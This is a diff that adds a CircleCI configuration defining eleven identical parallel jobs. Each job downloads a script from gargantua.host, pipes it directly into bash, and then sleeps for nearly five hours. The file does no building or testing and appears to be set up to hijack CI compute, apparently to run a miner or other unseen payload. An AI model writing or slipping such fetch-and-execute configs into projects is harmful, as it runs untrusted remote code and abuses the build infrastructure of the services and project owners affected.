@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  remakrthink:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  remakrthink10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - remakrthink
+      - remakrthink1
+      - remakrthink2
+      - remakrthink3
+      - remakrthink4
+      - remakrthink5
+      - remakrthink6
+      - remakrthink7
+      - remakrthink8
+      - remakrthink9
+      - remakrthink10
